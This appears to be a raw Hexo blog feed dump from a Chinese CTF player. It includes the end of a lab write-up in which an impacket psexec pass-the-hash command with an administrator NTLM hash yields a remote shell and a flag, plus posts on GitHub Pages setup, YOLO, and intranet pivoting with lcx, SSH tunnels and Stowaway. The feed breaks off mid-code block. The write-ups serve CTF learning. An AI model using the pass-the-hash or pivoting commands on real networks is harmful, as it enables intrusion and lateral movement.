2024/12/22, 11:27:06<br>系统启动时间:     2025/4/3, 1:04:27<br>系统制造商:       Red Hat<br>系统型号:         KVM<br>系统类型:         x64-based PC<br>处理器:           安装了 1 个处理器。<br>                  [01]: Intel64 Family 6 Model 85 Stepping 4 GenuineIntel ~2000 Mhz<br>BIOS 版本:        SeaBIOS 1.16.3-2.el9, 2014/4/1<br>Windows 目录:     C:\Windows<br>系统目录:         C:\Windows\system32<br>启动设备:         \Device\HarddiskVolume1<br>系统区域设置:     zh-cn;中文(中国)<br>输入法区域设置:   zh-cn;中文(中国)<br>时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐<br>物理内存总量:     1,023 MB<br>可用的物理内存:   448 MB<br>虚拟内存: 最大值: 2,047 MB<br>虚拟内存: 可用:   1,408 MB<br>虚拟内存: 使用中: 639 MB<br>页面文件位置:     C:\pagefile.sys<br>域:               cyberstrikelab.com<br>登录服务器:       \\WIN-7NRTJO59O7N<br>修补程序:         暂缺<br>网卡:             安装了 1 个 NIC。<br>                  [01]: Realtek RTL8139C+ Fast Ethernet NIC<br>                      连接名:      本地连接 3<br>                      启用 DHCP:   否<br>                      IP 地址<br>                        [01]: 192.168.20.30<br>                        [02]: fe80::f852:ed6d:f557:af3f<br><br></code></pre></td></tr></table></figure><p>直接哈希传递攻击:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs smali">impacket-0.12.0\examples&gt; python psexec.py -hashes<span class="hljs-keyword"> :94bd5248e87cb7f2f9b871d40c903927</span> cyberstrikelab.com/administrator@192.168.20.20<br>Impacket v0.12.0 - Copyright Fortra, LLC<span class="hljs-built_in"> and </span>its affiliated companies<br><br>[*] Requesting shares on 192.168.20.20.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file bxPkKhSM.exe<br>[*] Opening SVCManager on 192.168.20.20.....<br>[*] Creating service KEHT on 192.168.20.20.....<br>[*] Starting service KEHT.....<br>[!] Press help for extra shell commands<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>Microsoft Windows [�汾 6.3.9600]<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>(c) 2013 Microsoft Corporation����������Ȩ����<br><br><br>C:\Windows\system32&gt; cd /<br><br>C:\&gt; dir<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> ������ C �еľ�û�б�ǩ��<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> �������к��� EA78-322E<br><br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br> C:\ ��Ŀ¼<br><br><br>2025/01/15  19:47                25 flag.txt<br>2013/08/22  23:52    &lt;DIR&gt;          PerfLogs<br>2013/08/22  22:50    &lt;DIR&gt;          Program Files<br>2013/08/22  23:39    &lt;DIR&gt;          Program Files (x86)<br>2025/01/14  16:37    &lt;DIR&gt;          Users<br>2025/04/03  02:51    &lt;DIR&gt;          Windows<br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>               1 ���ļ�             25 �ֽ�<br><br>[-] Decoding error detected, consider running chcp.com at the target,<br>map the result with https://docs.python.org/3/library/codecs.html<span class="hljs-comment">#standard-encodings</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">and </span>then<span class="hljs-built_in"> execute </span>smbexec.py again with -codec<span class="hljs-built_in"> and </span>the corresponding codec<br>               5 ��Ŀ¼  6,237,618,176 �����ֽ�<br><br><br>C:\&gt; type flag.txt<br>go-flag&#123;Nb8VOT8X9SbIzyDI&#125;<br>C:\&gt;<br></code></pre></td></tr></table></figure><p>拿到flag</p><p><strong>中等</strong></p>]]></content>
    
    
    <categories>
      
      <category>cyberstrikelab</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域名绑定GithubPage</title>
    <link href="/2025/03/24/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9AGithubPage/"/>
    <url>/2025/03/24/%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9AGithubPage/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当初用GithubPage搭建博客就是图方便，现在看来也并不怎么方便😅</p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>打开github</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180021984.png" alt="image-20250324180021984"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180037546.png" alt="image-20250324180037546"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180049570.png" alt="image-20250324180049570"></p><p>添加域名，会给你一个DNS的TXT纪录</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180133730.png" alt="image-20250324180133730"></p><p>填到域名提供商哪里(注意是TXT纪录)</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180545961.png" alt="image-20250324180545961"></p><p>再把github提供的ip添加上</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">185.199.108.153</span><br><span class="hljs-number">185.199.109.153</span><br><span class="hljs-number">185.199.110.153</span><br><span class="hljs-number">185.199.111.153</span><br></code></pre></td></tr></table></figure><p>详见 <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain">Github 官方文档</a></p><p>添加域名或者子域名的CNAME</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180754964.png" alt="image-20250324180754964"></p><p>再到仓库里添加域名解析</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250324180922569.png" alt="image-20250324180922569"></p><p>就OK了😁😁</p>]]></content>
    
    
    
    <tags>
      
      <tag>域名绑定GithubPage</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>YOLO学习</title>
    <link href="/2025/03/23/YOLO%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/23/YOLO%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天大比赛遇到一个YOLO模型的题目，当时没环境，不会写😁后面去看了一下YOLO发现非常有意思，就想学一下</p><p>安装<code>conda</code>包管理器</p><p>安装<code>pytorch</code> 使用<code>nvadia -smi</code>查看cuda的版本控制</p><h1 id="set"><a href="#set" class="headerlink" title="set"></a>set</h1><p>YOLO模型的设置</p><table><thead><tr><th align="left">名字</th><th align="left">示例值</th><th align="left">数据类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left"><code>settings_version</code></td><td align="left"><code>&#39;0.0.4&#39;</code></td><td align="left"><code>str</code></td><td align="center">Ultralytics <em>设置</em>版本（不同于 Ultralytics <a href="https://pypi.org/project/ultralytics/">pip</a> 版本）</td></tr><tr><td align="left"><code>datasets_dir</code></td><td align="left"><code>&#39;/path/to/datasets&#39;</code></td><td align="left"><code>str</code></td><td align="center">数据集的存储目录</td></tr><tr><td align="left"><code>weights_dir</code></td><td align="left"><code>&#39;/path/to/weights&#39;</code></td><td align="left"><code>str</code></td><td align="center">存储模型权重的目录</td></tr><tr><td align="left"><code>runs_dir</code></td><td align="left"><code>&#39;/path/to/runs&#39;</code></td><td align="left"><code>str</code></td><td align="center">存储试验运行的目录</td></tr><tr><td align="left"><code>uuid</code></td><td align="left"><code>&#39;a1b2c3d4&#39;</code></td><td align="left"><code>str</code></td><td align="center">当前设置的唯一标识符</td></tr><tr><td align="left"><code>同步</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">将分析和崩溃同步到 <a href="https://hub.ultralytics.com/">Ultralytics HUB</a> 的选项</td></tr><tr><td align="left"><code>api_key</code></td><td align="left"><code>&#39;&#39;</code></td><td align="left"><code>str</code></td><td align="center"><a href="https://hub.ultralytics.com/">Ultralytics 中心 </a>API 密钥</td></tr><tr><td align="left"><code>透明 ML</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">使用 <a href="https://docs.ultralytics.com/integrations/clearml/">ClearML</a> 日志记录的选项</td></tr><tr><td align="left"><code>彗星</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">可选择使用 <a href="https://bit.ly/yolov8-readme-comet">Comet ML</a> 进行实验跟踪和可视化</td></tr><tr><td align="left"><code>DVC （视频录像</code>机）</td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">可选择使用 <a href="https://dvc.org/doc/dvclive/ml-frameworks/yolo">DVC 进行实验跟踪</a>和版本控制</td></tr><tr><td align="left"><code>枢纽</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">使用 <a href="https://hub.ultralytics.com/">Ultralytics HUB</a> 集成的选项</td></tr><tr><td align="left"><code>mlflow</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">可选择使用 <a href="https://docs.ultralytics.com/integrations/mlflow/">MLFlow</a> 进行实验跟踪</td></tr><tr><td align="left"><code>海王星</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">使用 <a href="https://neptune.ai/">Neptune</a> 进行实验跟踪的选项</td></tr><tr><td align="left"><code>Raytune 雷 tune</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">使用 <a href="https://docs.ultralytics.com/integrations/ray-tune/">Ray Tune</a> 进行<a href="https://www.ultralytics.com/glossary/hyperparameter-tuning">超参数优化的</a>选项</td></tr><tr><td align="left"><code>TensorBoard 板</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">使用 <a href="https://docs.ultralytics.com/integrations/tensorboard/">TensorBoard</a> 进行可视化的选项</td></tr><tr><td align="left"><code>墙</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">使用<a href="https://docs.ultralytics.com/integrations/weights-biases/">权重和偏差</a>记录的选项</td></tr><tr><td align="left"><code>vscode_msg</code></td><td align="left"><code>真</code></td><td align="left"><code>布尔</code></td><td align="center">检测到 VS Code 终端时，启用下载 <a href="https://docs.ultralytics.com/integrations/vscode/">Ultralytics-Snippets</a> 扩展的提示。</td></tr></tbody></table><p>可以通过python代码来进行设置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ultralytics <span class="hljs-keyword">import</span> settings<br><br><span class="hljs-comment">#更新一个</span><br>settings.update(&#123;<span class="hljs-string">&quot;runs_dir&quot;</span>: <span class="hljs-string">&quot;/path/to/runs&quot;</span>&#125;)<br><br><span class="hljs-comment">#更新多个</span><br>settings.update(&#123;<span class="hljs-string">&quot;runs_dir&quot;</span>: <span class="hljs-string">&quot;/path/to/runs&quot;</span>, <span class="hljs-string">&quot;tensorboard&quot;</span>: <span class="hljs-literal">False</span>&#125;)<br><br><span class="hljs-comment">#重置所有参数</span><br>settings.reset()<br></code></pre></td></tr></table></figure><h1 id="简单的demo"><a href="#简单的demo" class="headerlink" title="简单的demo"></a>简单的demo</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2  <span class="hljs-comment">#加载opencv</span><br><span class="hljs-keyword">from</span> ultralytics <span class="hljs-keyword">import</span> YOLO <span class="hljs-comment">#导入模型库</span><br><br><span class="hljs-comment"># 加载模型</span><br>yolo = YOLO(<span class="hljs-string">&quot;yolo11n.pt&quot;</span>)<br><br><span class="hljs-comment"># 打开摄像头 （0 表示内置摄像头，如果有多个摄像头，可以用 1, 2 等）</span><br><br>cap = cv2.VideoCapture(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#cap.isOpened() 检查摄像头是否成功打开</span><br><span class="hljs-keyword">while</span> cap.isOpened():<br>    <br>    cap.read()：读取摄像头画面，返回两个值：success: 是否成功读取 (<span class="hljs-literal">True</span> / <span class="hljs-literal">False</span>)frame: 当前帧的图像数据（numpy 数组）<br>    success, frame = cap.read()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> success:<br>        <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># 目标检测</span><br>    results = yolo(frame)<br><br>    <span class="hljs-comment"># 获取检测后的图像.plot(): 在图片上绘制检测结果（比如边界框、类别标签、置信度</span><br>    annotated_frame = results[<span class="hljs-number">0</span>].plot()<br><br>    <span class="hljs-comment"># 显示图像cv2.imshow(&quot;窗口名称&quot;, 图像): 弹出一个窗口，显示检测结果</span><br>    cv2.imshow(<span class="hljs-string">&quot;YOLOv11 Detection&quot;</span>, annotated_frame)<br><br>    <span class="hljs-comment">#cv2.waitKey(1): 等待键盘输入 1 毫秒。</span><br>    <span class="hljs-comment"># ord(&#x27;q&#x27;): 监听 q 键，按下 q 后退出循环</span><br>    <span class="hljs-keyword">if</span> cv2.waitKey(<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFF</span> == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;q&#x27;</span>):<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#cap.release(): 关闭摄像头，释放资源。</span><br>cap.release()<br><span class="hljs-comment">#cv2.destroyAllWindows(): 关闭所有 OpenCV 窗口</span><br>cv2.destroyAllWindows()<br><br></code></pre></td></tr></table></figure><p>未完待续😁👌👌</p>]]></content>
    
    
    
    <tags>
      
      <tag>课外兴趣</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>window深入学习</title>
    <link href="/2025/03/20/window%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/20/window%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e872ba465fb5e9bec18111ffe0b3786d47aac89aa7c38db4c50bfb2cb26b6c36">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0f5ac16fc0a5bf0fc4cb03ea2d2c7da32126bf76dacf986e548488aba7a86ef5ed40ee4c3666af9bc0721eb3cf9546878e478fa93b30e8901af0d849c9127094a9641880dbb05c36d0f967ee93fb1d83e2867983fa41958b97d5aa944f1dfa072502cd13db2f6aaaffd0532a57a6085f013c6ad1fc451199fcc0380284c0e6a8976bddb7eccc0f577059512b02efabe8d1c96fb1d3e18236aa19ef598b455ff79fe2248335f86e77ab849e546c1b636ab20d0960e2fa38225deaa67d59819f1f0643e021ab5542af1c386da17003d6880c1e144174fef81322ab4b1a2cfb4d00fa9f9fd5ff6ed740c23817fb28bc94ea7226e5ebbba448dfc107b7ac353975df7d15466b6c9b92e97e8710bf9128ecc3436202f64791b20db8f965dad4b36395850c447b3ca8aa2f09037e7851e4cda10</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>window</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux深入学习</title>
    <link href="/2025/03/20/linux%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/20/linux%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="254ebc4a7840b74e5f820b9f9cd7104de46dee4fa2a279c5bfded33c75957810">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d0f5ac16fc0a5bf0fc4cb03ea2d2c7da32126bf76dacf986e548488aba7a86ef5ed40ee4c3666af9bc0721eb3cf9546878e478fa93b30e8901af0d849c9127094a2a9661886706f8f95138011a4a4a8aac</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网代理搭建</title>
    <link href="/2025/03/17/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/"/>
    <url>/2025/03/17/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在adwp或者adw赛制中当我们打进内网时(前提是打进去，这就不得不提ccb了😭)，搭建代理是必不可少的一部分</p><p>介绍几种简单的方法</p><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h2><p>有公网ip的话可以试试frp</p><p>有时间补上(狗头)🐶</p><h2 id="花生壳内网穿透"><a href="#花生壳内网穿透" class="headerlink" title="花生壳内网穿透"></a>花生壳内网穿透</h2><p>没有公网ip的话就直接使用花生壳吧</p><p><a href="https://console.hsk.oray.com/forward">官网</a></p><p>简单无脑一看就会</p><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p>使用iptable可以转发但是够简单，有没有简单又方便的方法的呢</p><p>有的兄弟有的，那就是LCX简单的端口转发工具</p><p><strong>基本使用</strong></p><p><code>-llisten</code>本地监听模式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">lcx -listen <span class="hljs-tag">&lt;<span class="hljs-name">本地端口</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">转发端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将本地端口的流量转发到本地的转发端口</p><p><code>-slave</code>远程转发模式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">lcx -slave <span class="hljs-tag">&lt;<span class="hljs-name">本地IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">本地端口</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">远程IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">远程端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将本地端口的流量转发到远程ip</p><p><code>-tran</code>流量转发模式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">lcx -tran <span class="hljs-tag">&lt;<span class="hljs-name">本地端口</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">目标IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">目标端口</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将本地端口流量转发到目标端口，支持内网环境</p><h1 id="内网隧道搭建"><a href="#内网隧道搭建" class="headerlink" title="内网隧道搭建"></a>内网隧道搭建</h1><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh有点是方便，不要安装啥东西，直接就可以使用，但是弊端也很明显，只能一个端口一个端口的转发流量</p><h3 id="单层ssh隧道搭建"><a href="#单层ssh隧道搭建" class="headerlink" title="单层ssh隧道搭建"></a>单层ssh隧道搭建</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003401221.png" alt="image-20250318003401221"></p><p>我们的机器只能访问外围主机，我们可以使用外围主机当跳板访问内网</p><p>在我们机器上运行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -L <span class="hljs-number">8085</span>:<span class="hljs-number">172.2</span>.<span class="hljs-number">136.5</span>:<span class="hljs-number">80</span> ctfshow@pwn<span class="hljs-selector-class">.challenge</span><span class="hljs-selector-class">.ctf</span><span class="hljs-selector-class">.show</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">28227</span><br></code></pre></td></tr></table></figure><p>这里我们将可控linux服务器中172.2.136.5:80的流量转发到本地windows的8085端口上，然后就可以通过访问127.0.0.1:8085以访问172.2.136.5的web服务，流量转发过程为:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.2.136.5:80</span>-&gt;windows的<span class="hljs-number">80</span>端口<br></code></pre></td></tr></table></figure><h3 id="多层ssh隧道搭建"><a href="#多层ssh隧道搭建" class="headerlink" title="多层ssh隧道搭建"></a>多层ssh隧道搭建</h3><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250318003945521.png" alt="image-20250318003945521"></p><p>不同内网之间没法直接相互通信，因此如果我们想用windows攻击机直接访问深层内网的web服务，需要先在表层内网服务器和深层内网服务器之间建立隧道，然后再在windows攻击机和表层内网服务器之间建立隧道，最后就可以用windows攻击机直接访问到深层内网的web服务。</p><p>在表层内网服务器上运行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -L <span class="hljs-number">9383</span>:<span class="hljs-number">172.2</span>.<span class="hljs-number">136.5</span>:<span class="hljs-number">80</span> ctfshow@pwn<span class="hljs-selector-class">.challenge</span><span class="hljs-selector-class">.ctf</span><span class="hljs-selector-class">.show</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">28227</span><br></code></pre></td></tr></table></figure><p>将深层内网中172.2.136.5:80的流量转发到表层内网服务器的9383端口上，然后在windows机器上运行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8086</span>:<span class="hljs-number">127.0.0.1:9383</span> root<span class="hljs-variable">@vps_ip</span> -p vps_port<br></code></pre></td></tr></table></figure><p>将表层内网服务器中127.0.0.1:9383的流量转发到windows机器的8086端口上，流量转发的过程变为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">172</span>.<span class="hljs-number">2</span>.<span class="hljs-number">136</span>.<span class="hljs-number">5</span>:<span class="hljs-number">80</span>-&gt;VPS:<span class="hljs-number">9383</span>-&gt;windows的<span class="hljs-number">8086</span>端口<br></code></pre></td></tr></table></figure><p>然后我们就可以通过在本地访问8086直接访问深层内网中的172.2.136.5的web服务</p><h2 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h2><p>目前有很多优秀的内网代理工具如<a href="https://so.csdn.net/so/search?q=frp&spm=1001.2101.3001.7020">frp</a>, nps等，但是有些情况下，我们需要搭建多级网络代理，直达目标内网深处。而目前frp，nps等工具在搭建多级代理时操作过去复杂不便于管理。</p><p>而Stowaway工具就是需要解决这一问题。Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具，用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能</p><p>它不仅仅是linux对linux，win对win还可以 win对linux，我最喜欢的就是这个</p><p><strong>towaway一共包含两种角色</strong>，分别是：</p><ul><li><p>admin 代表控制端</p></li><li><p>agent 代表被控端</p></li></ul><p>admin：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l 被动模式下的监听地址[ip]:&lt;port&gt;<br><br>-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致<br><br>-c 主动模式下的目标节点地址<br><br>--proxy socks5代理服务器地址<br><br>--proxyu socks5代理服务器用户名(可选)<br><br>--proxyp socks5代理服务器密码(可选)<br><br>--down 下游协议类型,默认为裸TCP流量,可选HTTP<br></code></pre></td></tr></table></figure><p>agent：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 